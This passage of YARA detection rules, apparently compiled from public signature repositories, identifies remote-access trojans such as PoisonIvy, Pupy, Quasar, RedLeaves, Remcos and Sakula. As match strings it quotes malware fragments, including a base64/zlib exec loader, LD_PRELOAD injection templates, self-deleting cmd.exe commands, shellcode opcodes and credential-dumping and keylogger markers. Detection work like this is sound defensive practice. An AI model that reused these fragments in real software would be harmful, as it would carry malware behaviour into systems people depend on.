\"USER32.DLL\"\n        $s7 = \"CONOUT$\"\n        $s8 = \"login.asp\"\n        $h1 = \"HTTP/1.0\"\n        $h2 = \"POST\"\n        $h3 = \"login.asp\"\n        $h4 = \"check.asp\"\n        $h5 = \"result.asp\"\n        $h6 = \"upload.asp\"\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 500KB and ($k1 or all of ($s*) or all of ($h*))\n}\n\nrule poisonivy_1 : rat\n{\n    meta:\n        description = \"PoisonIvy RAT\"\n        ref = \"https://code.google.com/p/volatility/source/browse/trunk/contrib/plugins/malware/poisonivy.py\"\n        classifications = \"Backdoor\"\n        threat_names = \"PoisonIvy\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Jean-Philippe Teissier / @Jipe_\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"poisonivy_1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a = { 53 74 75 62 50 61 74 68 ?? 53 4F 46 54 57 41 52 45 5C 43 6C 61 73 73 65 73 5C 68 74 74 70 5C 73 68 65 6C 6C 5C 6F 70 65 6E 5C 63 6F 6D 6D 61 6E 64 [22] 53 6F 66 74 77 61 72 65 5C 4D 69 63 72 6F 73 6F 66 74 5C 41 63 74 69 76 65 20 53 65 74 75 70 5C 49 6E 73 74 61 6C 6C 65 64 20 43 6F 6D 70 6F 6E 65 6E 74 73 5C }\n\n    condition:\n        $a\n}\n\nrule PoisonIvy\n{\n    meta:\n        description = \"PoisonIvy RAT\"\n        ref = \"http://malwareconfig.com/stats/PoisonIvy\"\n        classifications = \"Backdoor\"\n        threat_names = \"PoisonIvy\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kevin Breen <kevin@techanarchy.net>\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"RAT_PoisonIvy\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $stub = {04 08 00 53 74 75 62 50 61 74 68 18 04}\n        $string1 = \"CONNECT %s:%i HTTP/1.0\"\n        $string2 = \"ws2_32\"\n        $string3 = \"cks=u\"\n        $string4 = \"thj@h\"\n        $string5 = \"advpack\"\n\n    condition:\n        $stub at 0x1620 and all of ($string*) or (all of them)\n}\n\nrule PredatorPain\n{\n    meta:\n        description = \"PredatorPain RAT\"\n        ref = \"http://malwareconfig.com/stats/PredatorPain\"\n        classifications = \"Backdoor\"\n        threat_names = \"PredatorPain\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kevin Breen <kevin@techanarchy.net>\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"RAT_PredatorPain\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $string1 = \"holderwb.txt\" wide\n        $string3 = \"There is a file attached to this email\" wide\n        $string4 = \"screens\\\\screenshot\" wide\n        $string5 = \"Disablelogger\" wide\n        $string6 = \"\\\\pidloc.txt\" wide\n        $string7 = \"clearie\" wide\n        $string8 = \"clearff\" wide\n        $string9 = \"emails should be sent to you shortly\" wide\n        $string10 = \"jagex_cache\\\\regPin\" wide\n        $string11 = \"open=Sys.exe\" wide\n        $ver1 = \"PredatorLogger\" wide\n        $ver2 = \"EncryptedCredentials\" wide\n        $ver3 = \"Predator Pain\" wide\n\n    condition:\n        7 of ($string*) and any of ($ver*)\n}\n\nrule Punisher\n{\n    meta:\n        description = \"Punisher RAT\"\n        ref = \"http://malwareconfig.com/stats/Punisher\"\n        classifications = \"Backdoor\"\n        threat_names = \"Punisher\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kevin Breen <kevin@techanarchy.net>\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"RAT_Punisher\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $a = \"abccba\"\n        $b = {5C 00 68 00 66 00 68 00 2E 00 76 00 62 00 73}\n        $c = {5C 00 73 00 63 00 2E 00 76 00 62 00 73}\n        $d = \"SpyTheSpy\" wide ascii\n        $e = \"wireshark\" wide\n        $f = \"apateDNS\" wide\n        $g = \"abccbaDanabccb\"\n\n    condition:\n        all of them\n}\n\nrule PupyRAT_PY\n{\n    meta:\n        description = \"Pupy RAT\"\n        ref = \"https://www.secureworks.com/blog/iranian-pupyrat-bites-middle-eastern-organizations\"\n        classifications = \"Backdoor, Spyware\"\n        threat_names = \"Pupy RAT\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT_PupyRAT_PY\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"reflective_inject_dll\" fullword ascii\n        $x2 = \"ImportError: pupy builtin module not found !\" fullword ascii\n        $x3 = \"please start pupy from either it's exe stub or it's reflective DLLR;\" fullword ascii\n        $x4 = \"[INJECT] inject_dll.\" fullword ascii\n        $x5 = \"import base64,zlib;exec zlib.decompress(base64.b64decode('eJzzcQz1c/ZwDbJVT87Py0tNLlHnAgA56wXS'))\" fullword ascii\n        $op1 = { 8b 42 0c 8b 78 14 89 5c 24 18 89 7c 24 14 3b fd }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 20000KB and 1 of them) or (2 of them)\n}\n\nrule Pupy_Backdoor\n{\n    meta:\n        description = \"Pupy RAT\"\n        ref = \"https://github.com/n1nj4sec/pupy-binaries\"\n        classifications = \"Backdoor, Spyware\"\n        threat_names = \"Pupy RAT\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Pupy_Backdoor\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"reflectively inject a dll into a process.\" fullword ascii\n        $x2 = \"ld_preload_inject_dll(cmdline, dll_buffer, hook_exit) -> pid\" fullword ascii\n        $x3 = \"LD_PRELOAD=%s HOOK_EXIT=%d CLEANUP=%d exec %s 1>/dev/null 2>/dev/null\" fullword ascii\n        $x4 = \"reflective_inject_dll\" fullword ascii\n        $x5 = \"ld_preload_inject_dll\" fullword ascii\n        $x6 = \"get_pupy_config() -> string\" fullword ascii\n        $x7 = \"[INJECT] inject_dll. OpenProcess failed.\" fullword ascii\n        $x8 = \"reflective_inject_dll\" fullword ascii\n        $x9 = \"reflective_inject_dll(pid, dll_buffer, isRemoteProcess64bits)\" fullword ascii\n        $x10 = \"linux_inject_main\" fullword ascii\n\n    condition:\n        ((uint16(0) == 0x457f or uint16(0) == 0x5a4d) and filesize < 7000KB and 1 of them) or 3 of them or (uint16(0) == 0x5a4d and pe.imphash() == \"84a69bce2ff6d9f866b7ae63bd70b163\")\n}\n\nrule pupy_rat\n{\n    meta:\n        description = \"Pupy RAT\"\n        ref = \"https://github.com/n1nj4sec/pupy\"\n        classifications = \"Backdoor, Spyware\"\n        threat_names = \"Pupy RAT\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"@mimeframe\"\n        source = \"https://github.com/airbnb/binaryalert\"\n        original_name = \"malware_multi_pupy_rat\"\n        license = \"Apache-2.0 (https://opensource.org/licenses/Apache-2.0)\"\n\n    strings:\n        $a1 = \"dumping lsa secrets\" nocase wide ascii\n        $a2 = \"dumping cached domain passwords\" nocase wide ascii\n        $a3 = \"the keylogger is already started\" nocase wide ascii\n        $a4 = \"pupyutils.dns\" wide ascii\n        $a5 = \"pupwinutils.security\" wide ascii\n        $a6 = \"-PUPY_CONFIG_COMES_HERE-\" wide ascii\n\n    condition:\n        3 of ($a*)\n}\n\nrule QRat\n{\n    meta:\n        description = \"QRAT malware\"\n        ref = \"http://malwareconfig.com\"\n        classifications = \"Backdoor\"\n        threat_names = \"QRAT\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kevin Breen @KevTheHermit\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"RAT_QRat\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $a0 = \"e-data\"\n        $a1 = \"quaverse/crypter\"\n        $a2 = \"Qrypt.class\"\n        $a3 = \"Jarizer.class\"\n        $a4 = \"URLConnection.class\"\n\n    condition:\n        4 of them\n}\n\nrule Quasar_RAT_1\n{\n    meta:\n        description = \"Quasar RAT\"\n        ref = \"https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf\"\n        classifications = \"Backdoor, Spyware\"\n        threat_names = \"Quasar\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Quasar_RAT_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"DoUploadAndExecute\" fullword ascii\n        $s2 = \"DoDownloadAndExecute\" fullword ascii\n        $s3 = \"DoShellExecute\" fullword ascii\n        $s4 = \"set_Processname\" fullword ascii\n        $op1 = { 04 1e fe 02 04 16 fe 01 60 }\n        $op2 = { 00 17 03 1f 20 17 19 15 28 }\n        $op3 = { 00 04 03 69 91 1b 40 }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 5000KB and all of ($s*) or all of ($op*))\n}\n\nrule Quasar_RAT_2\n{\n    meta:\n        description = \"Quasar RAT\"\n        ref = \"https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf\"\n        classifications = \"Backdoor, Spyware\"\n        threat_names = \"Quasar\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Quasar_RAT_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"GetKeyloggerLogsResponse\" fullword ascii\n        $x2 = \"get_Keylogger\" fullword ascii\n        $x3 = \"HandleGetKeyloggerLogsResponse\" fullword ascii\n        $s1 = \"DoShellExecuteResponse\" fullword ascii\n        $s2 = \"GetPasswordsResponse\" fullword ascii\n        $s3 = \"GetStartupItemsResponse\" fullword ascii\n        $s4 = \"<GetGenReader>b__7\" fullword ascii\n        $s5 = \"RunHidden\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 5000KB and $x1) or (all of them)\n}\n\nrule Quasar_RAT_Jan18_1\n{\n    meta:\n        description = \"Quasar RAT\"\n        ref = \"https://researchcenter.paloaltonetworks.com/2018/01/unit42-vermin-quasar-rat-custom-malware-used-ukraine/\"\n        classifications = \"Backdoor, Spyware\"\n        threat_names = \"Quasar\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Quasar_RAT_Jan18_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $a1 = \"ping -n 20 localhost > nul\" fullword wide\n        $s2 = \"HandleDownloadAndExecuteCommand\" fullword ascii\n        $s3 = \"DownloadAndExecute\" fullword ascii\n        $s4 = \"UploadAndExecute\" fullword ascii\n        $s5 = \"ShellCommandResponse\" fullword ascii\n        $s6 = \"Select * From Win32_ComputerSystem\" fullword wide\n        $s7 = \"Process could not be started!\" fullword wide\n        $s8 = \".Core.RemoteShell\" ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 600KB and $a1 and 3 of them\n}\n\nrule RedLeaves_DroppedFile_ImplantLoader_Starburn\n{\n    meta:\n        description = \"RedLeaves RAT\"\n        ref = \"https://www.us-cert.gov/ncas/alerts/TA17-117A\"\n        classifications = \"Backdoor\"\n        threat_names = \"RedLeaves\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"USG\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"REDLEAVES_DroppedFile_ImplantLoader_Starburn\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $XOR_Loop = {32 0c 3a 83 c2 02 88 0e 83 fa 08 [4-14] 32 0c 3a 83 c2 02 88 0e 83 fa 10}\n\n    condition:\n        any of them\n}\n\nrule RedLeaves_DroppedFile_ObfuscatedShellcodeAndRAT_handkerchief\n{\n    meta:\n        description = \"RedLeaves RAT\"\n        ref = \"https://www.us-cert.gov/ncas/alerts/TA17-117A\"\n        classifications = \"Backdoor\"\n        threat_names = \"RedLeaves\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"USG\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"REDLEAVES_DroppedFile_ObfuscatedShellcodeAndRAT_handkerchief\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $RedleavesStringObfu = {73 64 65 5e 60 74 75 74 6c 6f 60 6d 5e 6d 64 60 77 64 72 5e 65 6d 6d 6c 60 68 6f 2f 65 6d 6d}\n\n    condition:\n        any of them\n}\n\nrule RedLeaves_CoreImplant_UniqueStrings\n{\n    meta:\n        description = \"RedLeaves RAT\"\n        ref = \"https://www.us-cert.gov/ncas/alerts/TA17-117A\"\n        classifications = \"Backdoor\"\n        threat_names = \"RedLeaves\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"USG\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"REDLEAVES_CoreImplant_UniqueStrings\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $unique2 = \"RedLeavesSCMDSimulatorMutex\" nocase wide ascii\n        $unique4 = \"red_autumnal_leaves_dllmain.dll\" wide ascii\n        $unique7 = \"\\\\NamePipe_MoreWindows\" wide ascii\n\n    condition:\n        any of them\n}\n\nrule RedLeaves_Apr18_1\n{\n    meta:\n        description = \"RedLeaves RAT\"\n        ref = \"https://www.accenture.com/t20180423T055005Z__w__/se-en/_acnmedia/PDF-76/Accenture-Hogfish-Threat-Analysis.pdf\"\n        classifications = \"Backdoor\"\n        threat_names = \"RedLeaves\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"MAL_RedLeaves_Apr18_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1000KB and (pe.imphash() == \"7a861cd9c495e1d950a43cb708a22985\" or pe.imphash() == \"566a7a4ef613a797389b570f8b4f79df\")\n}\n\nrule RedLeaves_generic\n{\n    meta:\n        description = \"RedLeaves RAT\"\n        classifications = \"Backdoor\"\n        threat_names = \"RedLeaves\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"David Cannings\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"malware_red_leaves_generic\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $ = \"Feb 04 2015\"\n        $ = \"I can not start %s\"\n        $ = \"dwConnectPort\" fullword\n        $ = \"dwRemoteLanPort\" fullword\n        $ = \"strRemoteLanAddress\" fullword\n        $ = \"strLocalConnectIp\" fullword\n        $ = \"\\\\\\\\.\\\\pipe\\\\NamePipe_MoreWindows\" wide\n        $ = \"RedLeavesCMDSimulatorMutex\" wide\n        $ = \"(NT %d.%d Build %d)\" wide\n        $ = \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)\" wide\n        $ = \"red_autumnal_leaves_dllmain.dll\" wide ascii\n        $ = \"__data\" wide\n        $ = \"__serial\" wide\n        $ = \"__upt\" wide\n        $ = \"__msgid\" wide\n\n    condition:\n        7 of them\n}\n\nrule RedLeaves_memory\n{\n    meta:\n        description = \"RedLeaves RAT\"\n        classifications = \"Backdoor\"\n        threat_names = \"RedLeaves\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"David Cannings\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"malware_red_leaves_memory\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $ = \"__msgid=\" wide ascii\n        $ = \"__serial=\" wide ascii\n        $ = \"OnlineTime=\" wide\n        $ = \"clientpath=\" wide ascii\n        $ = \"serverpath=\" wide ascii\n\n    condition:\n        3 of them\n}\n\nrule remcos_rat\n{\n    meta:\n        description = \"Remcos RAT\"\n        ref = \"https://blog.fortinet.com/2017/02/14/remcos-a-new-rat-in-the-wild-2, https://breaking-security.net/remcos/remcos-changelog/\"\n        classifications = \"Backdoor\"\n        threat_names = \"Remcos\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"@mimeframe\"\n        source = \"https://github.com/airbnb/binaryalert\"\n        original_name = \"malware_windows_remcos_rat\"\n        license = \"Apache-2.0 (https://opensource.org/licenses/Apache-2.0)\"\n\n    strings:\n        $a1 = \"[Following text has been pasted from clipboard:]\" wide ascii\n        $a2 = \"[Chrome StoredLogins found, cleared!]\" wide ascii\n        $a3 = \"[Firefox StoredLogins cleared!]\" wide ascii\n        $b1 = \"getclipboard\" wide ascii\n        $b2 = \"stopmiccapture\" wide ascii\n        $b3 = \"downloadfromurltofile\" wide ascii\n        $b4 = \"getcamsingleframe\" wide ascii\n        $c1 = \"Breaking-Security.Net\" wide ascii\n        $c2 = \"REMCOS v\" wide ascii\n\n    condition:\n        any of ($a*) or 3 of ($b*) or all of ($c*)\n}\n\nrule RevengeRAT_Sep17\n{\n    meta:\n        description = \"RevengeRAT malware\"\n        classifications = \"Backdoor\"\n        threat_names = \"RevengeRAT\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"RevengeRAT_Sep17\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"Nuclear Explosion.g.resources\" fullword ascii\n        $x3 = \"03C7F4E8FB359AEC0EEF0814B66A704FC43FB3A8\" fullword ascii\n        $x4 = \"5B1EE7CAD3DFF220A95D1D6B91435D9E1520AC41\" fullword ascii\n        $x5 = \"\\\\RevengeRAT\\\\\" ascii\n        $x6 = \"Revenge-RAT client has been successfully installed.\" ascii\n        $x7 = \"Nuclear Explosion.exe\" fullword ascii\n        $x8 = \" Revenge-RAT 201\" wide\n        $s1 = \"{11111-22222-20001-00001}\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 500KB and 1 of ($x*)) or (3 of them)\n}\n\nrule Sakula_xorloop\n{\n    meta:\n        description = \"Sakula / Sakurel / VIPER RAT\"\n        classifications = \"Backdoor\"\n        threat_names = \"Sakula\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"David Cannings\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"malware_sakula_xorloop\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $opcodes_decode_loop01 = { 31 C0 8A 04 0B 3C 00 74 09 38 D0 74 05 30 D0 88 04 0B }\n        $opcodes_decode_loop02 = { 8B 45 08 8D 0C 02 8A 01 84 C0 74 08 3C ?? 74 04 34 ?? 88 01 }\n\n    condition:\n        uint16(0) == 0x5a4d and any of ($opcodes*)\n}\n\nrule Sakula_memory\n{\n    meta:\n        description = \"Sakula / Sakurel / VIPER RAT\"\n        classifications = \"Backdoor\"\n        threat_names = \"Sakula\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"David Cannings\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"malware_sakula_memory\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $str01 = \"cmd.exe /c ping 127.0.0.1 & del \\\"%s\\\"\"\n        $str02 = \"cmd.exe /c rundll32 \\\"%s\\\" Play \\\"%s\\\"\"\n        $str03 = \"Mozilla/4.0+(compatible;+MSIE+8.0;+Windows+NT+5.1;+SV1)\"\n        $str04 = \"cmd.exe /c cmd.exe /c cmd.exe /c cmd.exe /c cmd.exe /c cmd.exe /c \\\"%s\\\"\"\n        $str05 = \"Self Process Id:%d\"\n        $str06 = \"%d_%d_%d_%s\"\n        $str07 = \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)\"\n        $str08 = \"cmd.exe /c rundll32 \\\"%s\\\" ActiveQvaw \\\"%s\\\"\"\n        $opcodes01 = { 83 F9 00 74 0E 31 C0 8A 03 D0 C0 34 ?? 88 03 49 43 EB ED }\n        $opcodes02 = { 31 C0 8A 04 13 32 01 83 F8 00 75 0E 83 FA 00 74 04 49 4A }\n\n    condition:\n        4 of them\n}\n\nrule Sakula_shellcode\n{\n    meta:\n        description = \"Sakula / Sakurel / VIPER RAT shellcode\"\n        classifications = \"Backdoor\"\n        threat_names = \"Sakula\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"David Cannings\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"malware_sakula_shellcode\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $opcodes01 = { 55 89 E5 E8 00 00 00 00 58 83 C0 06 C9 C3 }\n        $opcodes02 = { 8B 5E 3C 8B 5C 1E 78 8B 4C 1E 20 53 8B 5C 1E 24 01 F3 }\n\n    condition:\n        any of them\n}\n\nrule Sakula\n{\n    meta:\n        description = \"Sakula / Sakurel / VIPER v1.0 RAT\"\n        ref = \"http://blog.airbuscybersecurity.com/public/YFR/sakula_v1x.yara\"\n        classifications = \"Backdoor\"\n        threat_names = \"Sakula\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Airbus Defence and Space Cybersecurity CSIRT - Yoann Francou / NCC Group David Cannings\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"RAT_Sakula\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"%d_of_%d_for_%s_on_%s\"\n        $s2 = \"/c ping 127.0.0.1 & del /q \\\"%s\\\"\"\n        $s3 = \"=%s&type=%d\"\n        $s4 = \"?photoid=\"\n        $s5 = \"iexplorer\"\n        $s6 = \"net start \\\"%s\\\"\"\n        $s7 = \"cmd.exe /c rundll32 \\\"%s\\\"\"\n        $v1_1 = \"MicroPlayerUpdate.exe\"\n        $v1_2 = \"CCPUpdate\"\n        $v1_3 = { 81 3E 78 03 00 00 75 57  8D 54 24 14 52 68 0C 05 41 00 68 01 00 00 80 FF  15 00 F0 40 00 85 C0 74 10 8B 44 24 14 68 2C 31  41 00 50 FF 15 10 F0 40 00 8B 4C 24 14 51 FF 15  24 F0 40 00 E8 0F 09 00 }\n        $v1_4 = { 50 E8 CD FC FF FF 83 C4  04 68 E8 03 00 00 FF D7 56 E8 54 12 00 00 E9 AE  FE FF FF E8 13 F5 FF FF }\n        $serial01 = { 31 06 2e 48 3e 01 06 b1 8c 98 2f 00 53 18 5c 36 }\n        $serial02 = { 01 a5 d9 59 95 19 b1 ba fc fa d0 e8 0b 6d 67 35 }\n        $serial03 = { 47 d5 d5 37 2b cb 15 62 b4 c9 f4 c2 bd f1 35 87 }\n        $serial04 = { 3a c1 0e 68 f1 ce 51 9e 84 dd cd 28 b1 1f a5 42 }\n        $opcodes1 = { 89 FF 55 89 E5 83 EC 20 A1 ?? ?? ?? 00 83 F8 00 }\n        $opcodes2 = { 31 C0 8A 04 0B 3C 00 74 09 38 D0 74 05 30 D0 88 04 0B }\n        $opcodes3 = { 8B 45 08 8D 0C 02 8A 01 84 C0 74 08 3C ?? 74 04 34 ?? 88 01 }\n        $opcodes4 = { 30 14 38 8D 0C 38 40 FE C2 3B C6 }\n        $opcodes5 = { 30 14 39 8D 04 39 41 FE C2 3B CE }\n        $fp1 = \"Symantec Corporation\" ascii wide\n\n    condition:\n        uint16(0) == 0x5a4d and ((3 of ($s*) and any of ($v1_*)) or (any of ($serial0*)) or (any of ($opcodes*))) and not 1 of ($fp*)\n}\n\nrule sakula_v1_0 : RAT\n{\n    meta:\n        description = \"Sakula / Sakurel / VIPER v1.0 RAT\"\n        classifications = \"Backdoor\"\n        threat_names = \"Sakula\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Airbus Defence and Space Cybersecurity CSIRT - Yoann Francou\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"sakula_v1_0\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $m1 = \"%d_of_%d_for_%s_on_%s\"\n        $m2 = \"/c ping 127.0.0.1 & del /q \\\"%s\\\"\"\n        $m3 = \"=%s&type=%d\"\n        $m4 = \"?photoid=\"\n        $m5 = \"iexplorer\"\n        $m6 = \"net start \\\"%s\\\"\"\n        $v1_1 = \"MicroPlayerUpdate.exe\"\n\n    condition:\n        uint16(0) == 0x5a4d and all of ($m*) and not $v1_1\n}\n\nrule sakula_v1_1 : RAT\n{\n    meta:\n        description = \"Sakula / Sakurel / VIPER v1.1 RAT\"\n        classifications = \"Backdoor\"\n        threat_names = \"Sakula\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Airbus Defence and Space Cybersecurity CSIRT - Yoann Francou\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"sakula_v1_1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $m1 = \"%d_of_%d_for_%s_on_%s\"\n        $m2 = \"/c ping 127.0.0.1 & del /q \\\"%s\\\"\"\n        $m3 = \"=%s&type=%d\"\n        $m4 = \"?photoid=\"\n        $m5 = \"iexplorer\"\n        $m6 = \"net start \\\"%s\\\"\"\n        $v1_1 = \"MicroPlayerUpdate.exe\"\n\n    condition:\n        uint16(0) == 0x5a4d and all of them\n}\n\nrule sakula_v1_2 : RAT\n{\n    meta:\n        description = \"Sakula / Sakurel / VIPER v1.2 RAT\"\n        classifications = \"Backdoor\"\n        threat_names = \"Sakula\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Airbus Defence and Space Cybersecurity CSIRT - Yoann Francou\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"sakula_v1_2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $m1 = \"%d_of_%d_for_%s_on_%s\"\n        $m2 = \"/c ping 127.0.0.1 & del /q \\\"%s\\\"\"\n        $m3 = \"cmd.exe /c rundll32 \\\"%s\\\"\"\n        $v1_1 = \"MicroPlayerUpdate.exe\"\n        $v1_2 = 